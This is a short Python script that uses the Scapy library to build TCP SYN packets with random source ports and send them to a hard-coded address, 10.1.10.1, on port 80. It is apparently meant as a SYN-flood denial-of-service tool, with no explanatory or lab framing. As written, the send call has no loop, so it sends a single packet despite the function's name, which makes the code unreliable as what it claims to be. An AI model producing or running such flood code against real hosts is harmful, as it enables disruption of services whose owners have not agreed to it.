from scapy.all import *

def send_syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    syn_packet = TCP(sport=RandShort(), dport=target_port, flags='S')
    syn_flood = ip / syn_packet
    send(syn_flood, inter=0.001)

target_ip = '10.1.10.1'
target_port = 80
send_syn_flood(target_ip, target_port)